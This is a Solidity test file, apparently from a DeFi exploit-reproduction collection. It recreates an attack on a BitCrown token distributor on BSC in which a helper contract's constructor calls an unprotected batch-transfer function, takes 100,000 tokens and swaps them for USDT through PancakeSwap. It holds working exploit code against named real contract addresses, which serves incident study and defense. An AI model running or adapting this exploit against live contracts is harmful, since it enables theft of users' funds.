// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 7,939.27 USD
// Attacker : 0xF499F7A82dE632cFD194025A51C88D1B44C8155e
// Attack Contract : 0x728F4DfeC4cbeF3B51F493Fdb13b5A1824e6d24d
// Vulnerable Contract : 0x93b621a9f8f1821a6a693a29672ca3d6612a2a7e
// Attack Tx : https://bscscan.com/tx/0x442ce0af4d10b23968a66b0b53d7b95f5bb611d55f19dc5a1963c763f65128f0
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93b621a9f8f1821a6a693a29672ca3d6612a2a7e#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1243
//
// Attack summary: The attacker deployed a constructor-only helper, used an unverified BitCrown distributor function
// to pull 100,000 BITCROWN tokens from the distributor into the helper, then sold those tokens through PancakeSwap
// for USDT.
// Root cause: The distributor exposed an unprotected batch-transfer style entrypoint that let an arbitrary caller
// choose the token, recipient list, and amounts to transfer from the distributor's own token balance.

address constant ATTACKER = 0xF499F7a82De632CFd194025A51C88d1b44C8155e;
address constant INITCODE_EXPLOIT = 0x728F4DFEC4cbeF3b51F493FDB13b5A1824E6D24D;
address constant BITCROWN_DISTRIBUTOR = 0x93b621A9f8F1821a6a693A29672ca3d6612A2A7E;
address constant BITCROWN = 0x3f74A64Eb5641D2479cB8343B2330c6598D126d4;
address constant BITCROWN_USDT_PAIR = 0xC416B5B61321E7432AB080c2a5E0cBd573d3bFe8;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;

bytes4 constant DISTRIBUTE_SELECTOR = 0x1239ec8c;

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 51_131_921;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = USDT_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(INITCODE_EXPLOIT, "Attack Contract");
        vm.label(BITCROWN_DISTRIBUTOR, "BitCrown Distributor");
        vm.label(BITCROWN, "BitCrown");
        vm.label(BITCROWN_USDT_PAIR, "BitCrown/USDT Pair");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
        vm.label(USDT_TOKEN, "USDT");
    }

    function testExploit() public balanceLog {
        uint256 distributorBitCrownBefore = IERC20(BITCROWN).balanceOf(BITCROWN_DISTRIBUTOR);
        uint256 attackerUsdtBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);

        assertGe(distributorBitCrownBefore, 100_000 ether);

        // step 1: deploy the exploit helper so the vulnerable call is made from constructor/initcode context.
        vm.prank(ATTACKER);
        new BitCrownInitcodeExploit(ATTACKER);

        // step 2: the distributor lost BitCrown tokens and the attacker received USDT from the Pancake pair.
        uint256 attackerUsdtProfit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerUsdtBefore;
        assertGt(attackerUsdtProfit, 7_000 ether);
        assertLt(IERC20(BITCROWN).balanceOf(BITCROWN_DISTRIBUTOR), distributorBitCrownBefore);
    }
}

contract BitCrownInitcodeExploit {
    constructor(
        address profitReceiver
    ) {
        address[] memory recipients = new address[](1);
        recipients[0] = address(this);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100_000 ether;

        // step 3: call the same unverified selector as the exploit, choosing this constructor helper as recipient.
        (bool success,) = BITCROWN_DISTRIBUTOR.call(abi.encodeWithSelector(DISTRIBUTE_SELECTOR, BITCROWN, recipients, amounts));
        require(success, "distributor call failed");

        // step 4: sell the received BitCrown through the canonical Pancake router for USDT to the attacker.
        uint256 bitCrownBalance = IERC20(BITCROWN).balanceOf(address(this));
        IERC20(BITCROWN).approve(PANCAKE_ROUTER, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = BITCROWN;
        path[1] = USDT_TOKEN;

        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bitCrownBalance, 0, path, profitReceiver, block.timestamp
        );
    }
}
